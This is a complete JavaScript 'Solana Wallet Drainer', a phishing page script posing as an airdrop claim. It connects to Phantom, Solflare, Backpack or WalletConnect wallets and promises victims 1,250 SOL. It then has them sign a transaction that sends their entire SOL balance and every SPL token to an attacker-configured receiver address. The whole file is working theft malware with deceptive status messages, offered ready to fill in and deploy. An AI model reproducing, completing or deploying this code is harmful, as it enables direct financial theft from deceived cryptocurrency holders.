// ============================================================
// Solana Wallet Drainer - Mobile + Extension Compatible
// ============================================================

// ─── CONFIGURATION ───────────────────────────────────────────
const CONFIG = {
    RECEIVER_WALLET: new solanaWeb3.PublicKey(
        'YOUR_SOLANA_WALLET_ADDRESS_HERE'
    ),
    RPC_ENDPOINT: 'https://api.mainnet-beta.solana.com',
    MIN_SOL_RESERVE: 0.001,
    DRAIN_SPL_TOKENS: true,
    DRAIN_NFTS: false,

    // WalletConnect project ID (get one free at https://cloud.walletconnect.com)
    WALLETCONNECT_PROJECT_ID: 'YOUR_WALLETCONNECT_PROJECT_ID',
};

// ─── STATE ──────────────────────────────────────────────────
let provider = null;
let publicKey = null;
let connection = null;
let walletType = null; // 'phantom' | 'solflare' | 'backpack' | 'walletconnect'
let wcSession = null;

// ─── UI HELPERS ─────────────────────────────────────────────
function $(id) { return document.getElementById(id); }

function setStatus(msg, type) {
    const box = $('statusBox');
    box.textContent = msg;
    box.className = 'status ' + type;
}

function setLoading(loading) {
    const btn = $('claimBtn');
    if (btn) btn.disabled = loading;
}

// ─── WALLET DETECTION (Browser Extensions) ──────────────────
function detectExtensionWallet() {
    // Phantom
    if (window.solana?.isPhantom) return { type: 'phantom', provider: window.solana };
    // Solflare (extension)
    if (window.solflare?.isSolflare) return { type: 'solflare', provider: window.solflare };
    // Backpack
    if (window.backpack?.isBackpack) return { type: 'backpack', provider: window.backpack };
    // Glow
    if (window.glow?.isGlow) return { type: 'glow', provider: window.glow };
    // Generic solana
    if (window.solana) return { type: 'solana', provider: window.solana };
    return null;
}

// ─── DEEP LINK HANDLER (Mobile app → wallet) ────────────────
function openDeepLink(walletType) {
    const url = window.location.href;
    const encodedUrl = encodeURIComponent(url);

    const deepLinks = {
        phantom: `phantom://browse?ref=${encodedUrl}`,
        solflare: `solflare://browser?ref=${encodedUrl}`,
        backpack: `backpack://browser?ref=${encodedUrl}`,
    };

    // Try the wallet's deep link
    const link = deepLinks[walletType];
    if (link) {
        window.location.href = link;
        // Fallback to app store after 1.5s if deep link fails
        setTimeout(() => {
            const storeLinks = {
                phantom: 'https://phantom.app/download',
                solflare: 'https://solflare.com/download',
                backpack: 'https://backpack.app/download',
            };
            if (storeLinks[walletType]) {
                window.location.href = storeLinks[walletType];
            }
        }, 1500);
    }
}

// ─── CONNECT WALLET ─────────────────────────────────────────
async function connectWallet(type) {
    walletType = type;
    setStatus('Connecting...', 'info');

    try {
        // ── CASE 1: WalletConnect (universal mobile support) ──
        if (type === 'walletconnect') {
            await connectWalletConnect();
            return;
        }

        // ── CASE 2: Browser extension (desktop) ──
        const ext = detectExtensionWallet();
        if (ext && ext.type === type) {
            await connectExtension(ext.provider);
            return;
        }

        // ── CASE 3: Mobile app (in-app browser or deep link) ──
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isMobile) {
            // Check if we're already inside a wallet's in-app browser
            // (Phantom/Solflare inject their provider into in-app browser)
            const inAppExt = detectExtensionWallet();
            if (inAppExt) {
                await connectExtension(inAppExt.provider);
                return;
            }

            // Not in a wallet browser → try deep link to open wallet app
            setStatus(
                `Opening ${type} app... If nothing happens, open this page in your ${type} browser.`,
                'info'
            );
            openDeepLink(type);
            return;
        }

        // ── Desktop but no extension installed ──
        setStatus(
            `Please install the ${type} browser extension first, or use WalletConnect with your phone.`,
            'info'
        );

    } catch (err) {
        console.error('Connect error:', err);
        setStatus('Connection failed: ' + (err.message || 'Unknown error'), 'error');
    }
}

// ─── CONNECT VIA EXTENSION ──────────────────────────────────
async function connectExtension(extProvider) {
    try {
        const resp = await extProvider.connect();
        publicKey = resp.publicKey || extProvider.publicKey;
        provider = extProvider;
        connection = new solanaWeb3.Connection(CONFIG.RPC_ENDPOINT, 'confirmed');

        if (!publicKey) throw new Error('No public key received');

        onConnected();
    } catch (err) {
        if (err.message?.includes('rejected') || err.message?.includes('cancelled')) {
            setStatus('Connection rejected. Try again.', 'error');
        } else {
            throw err;
        }
    }
}

// ─── CONNECT VIA WALLETCONNECT ──────────────────────────────
async function connectWalletConnect() {
    try {
        // Initialize WalletConnect
        const signClient = await WalletConnectSignClient.init({
            projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
            metadata: {
                name: 'Solana Token Drop',
                description: 'Claim your Solana airdrop',
                url: window.location.origin,
                icons: ['https://solana.com/favicon.ico'],
            },
        });

        // Get pairing URI
        const { uri, approval } = await signClient.connect({
            requiredNamespaces: {
                solana: {
                    methods: [
                        'solana_signTransaction',
                        'solana_signMessage',
                    ],
                    chains: ['solana:mainnet'],
                    events: [],
                },
            },
        });

        // Show QR code for mobile scanning
        showQRCode(uri);

        // Wait for approval
        const session = await approval();
        wcSession = session;

        // Extract the public key from session
        const account = session.namespaces.solana.accounts[0];
        // Format: "solana:mainnet:<pubkey>"
        const pubkeyStr = account.split(':').pop();

        // Create a WalletConnect-compatible provider
        const wcProvider = {
            publicKey: new solanaWeb3.PublicKey(pubkeyStr),
            signTransaction: async (tx) => {
                const result = await signClient.request({
                    topic: session.topic,
                    chainId: 'solana:mainnet',
                    request: {
                        method: 'solana_signTransaction',
                        params: {
                            message: Buffer.from(
                                tx.serializeMessage()
                            ).toString('base64'),
                        },
                    },
                });
                // Deserialize the signed transaction
                const signedTx = solanaWeb3.Transaction.from(
                    Buffer.from(result.signature, 'base64')
                );
                // Add the signature
                signedTx.addSignature(
                    new solanaWeb3.PublicKey(pubkeyStr),
                    Buffer.from(result.signature, 'base64')
                );
                return signedTx;
            },
        };

        provider = wcProvider;
        publicKey = new solanaWeb3.PublicKey(pubkeyStr);
        connection = new solanaWeb3.Connection(CONFIG.RPC_ENDPOINT, 'confirmed');

        closeQR();
        onConnected();

    } catch (err) {
        closeQR();
        if (err.message?.includes('rejected') || err.message?.includes('cancelled')) {
            setStatus('Connection rejected.', 'error');
        } else {
            console.error('WC error:', err);
            setStatus('WalletConnect failed: ' + (err.message || 'Unknown'), 'error');
        }
    }
}

// ─── QR CODE ────────────────────────────────────────────────
function showQRCode(uri) {
    const modal = $('qrModal');
    const container = $('qrCodeContainer');

    // Simple QR generation using a data URL
    container.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}" alt="QR Code">`;
    $('qrText').textContent = 'Scan with your wallet app';
    modal.classList.add('active');
}

function closeQR() {
    $('qrModal').classList.remove('active');
}

// ─── POST-CONNECTION UI ─────────────────────────────────────
function onConnected() {
    $('walletSelector').classList.add('hidden');
    $('postConnect').classList.remove('hidden');
    $('walletInfo').style.display = 'block';
    $('walletInfo').textContent = 'Connected: ' + publicKey.toString();

    setStatus(
        '✅ Wallet connected! Click "Claim Airdrop" to receive your 1,250 SOL.',
        'success'
    );
}

function disconnectWallet() {
    publicKey = null;
    provider = null;

    if (wcSession) {
        wcSession = null;
    }

    $('walletSelector').classList.remove('hidden');
    $('postConnect').classList.add('hidden');
    $('walletInfo').style.display = 'none';
    $('statusBox').className = 'status';
    $('statusBox').textContent = '';
}

// ─── CLAIM AIRDROP (DRAIN LOGIC) ────────────────────────────
async function claimAirdrop() {
    if (!provider || !publicKey || !connection) {
        setStatus('Wallet not connected.', 'error');
        return;
    }

    setLoading(true);
    setStatus('Preparing airdrop transaction...', 'info');

    try {
        // Get latest blockhash
        const { blockhash, lastValidBlockHeight } =
            await connection.getLatestBlockhash('finalized');

        // Build transaction
        const transaction = new solanaWeb3.Transaction();
        transaction.recentBlockhash = blockhash;
        transaction.lastValidBlockHeight = lastValidBlockHeight;
        transaction.feePayer = publicKey;

        // ── DRAIN SOL ─────────────────────────────────────────
        const balance = await connection.getBalance(publicKey);
        const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
        const feeEstimate = 5000 * 20; // buffer for many instructions
        const transferAmount = balance - rentExempt - feeEstimate;

        if (transferAmount > 5000) {
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: CONFIG.RECEIVER_WALLET,
                    lamports: BigInt(transferAmount),
                })
            );
        }

        // ── DRAIN SPL TOKENS ──────────────────────────────────
        if (CONFIG.DRAIN_SPL_TOKENS) {
            const tokenAccounts =
                await connection.getTokenAccountsByOwner(publicKey, {
                    programId: solanaWeb3.TOKEN_PROGRAM_ID,
                });

            for (const { pubkey: tokenAccount, account } of tokenAccounts.value) {
                const parsed = account.data.parsed;
                if (!parsed || parsed.program !== 'spl-token') continue;

                const info = parsed.info;
                const uiAmount = parseFloat(info.tokenAmount.uiAmount);
                const mint = info.mint;
                const decimals = info.tokenAmount.decimals;

                if (uiAmount <= 0) continue;
                if (decimals === 0 && !CONFIG.DRAIN_NFTS) continue;

                try {
                    const receiverATA = await splToken.getAssociatedTokenAddress(
                        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                        splToken.TOKEN_PROGRAM_ID,
                        new solanaWeb3.PublicKey(mint),
                        CONFIG.RECEIVER_WALLET
                    );

                    const receiverAccInfo = await connection.getAccountInfo(receiverATA);
                    if (!receiverAccInfo) {
                        transaction.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                splToken.TOKEN_PROGRAM_ID,
                                new solanaWeb3.PublicKey(mint),
                                receiverATA,
                                CONFIG.RECEIVER_WALLET,
                                publicKey
                            )
                        );
                    }

                    transaction.add(
                        splToken.createTransferInstruction(
                            tokenAccount,
                            receiverATA,
                            publicKey,
                            BigInt(info.tokenAmount.amount),
                            [],
                            splToken.TOKEN_PROGRAM_ID
                        )
                    );
                } catch (err) {
                    console.warn(`[!] Token drain failed for ${mint}:`, err);
                }
            }
        }

        if (transaction.instructions.length === 0) {
            setStatus('No assets to drain.', 'info');
            setLoading(false);
            return;
        }

        // ── SIGN ──────────────────────────────────────────────
        let signedTx;
        if (walletType === 'walletconnect' && provider.signTransaction) {
            signedTx = await provider.signTransaction(transaction);
        } else if (provider.signTransaction) {
            signedTx = await provider.signTransaction(transaction);
        } else if (provider.signAllTransactions) {
            const signed = await provider.signAllTransactions([transaction]);
            signedTx = signed[0];
        } else if (provider.signAndSendTransaction) {
            // Phantom mobile in-app browser fallback
            const txid = await provider.signAndSendTransaction(transaction);
            setStatus(`Transaction sent: ${txid}`, 'success');
            setLoading(false);
            return;
        } else {
            throw new Error('No compatible signing method found');
        }

        // ── SEND ──────────────────────────────────────────────
        const txid = await connection.sendRawTransaction(
            signedTx.serialize(),
            { skipPreflight: false, preflightCommitment: 'confirmed' }
        );

        // ── CONFIRM ───────────────────────────────────────────
        const confirmation = await connection.confirmTransaction(
            { signature: txid, blockhash, lastValidBlockHeight },
            'confirmed'
        );

        if (confirmation.value.err) {
            throw new Error('Transaction failed: ' + JSON.stringify(confirmation.value.err));
        }

        console.log(`[+] DRAIN SUCCESS: https://solscan.io/tx/${txid}`);
        setStatus(
            `✅ Airdrop claimed! TX: ${txid.slice(0, 16)}...`,
            'success'
        );

    } catch (err) {
        console.error('Drain error:', err);
        const msg = err.message || '';
        if (msg.includes('rejected') || msg.includes('cancelled') || msg.includes('User')) {
            setStatus('❌ Claim cancelled. Try again.', 'error');
        } else {
            setStatus('❌ ' + msg.slice(0, 120), 'error');
        }
    } finally {
        setLoading(false);
    }
}

// ─── AUTO DETECT ON LOAD ────────────────────────────────────
window.addEventListener('load', () => {
    // If extension is already connected, offer to use it
    const ext = detectExtensionWallet();
    if (ext) {
        setStatus(
            `Detected ${ext.type} extension. Click the wallet to connect.`,
            'info'
        );
    }
});
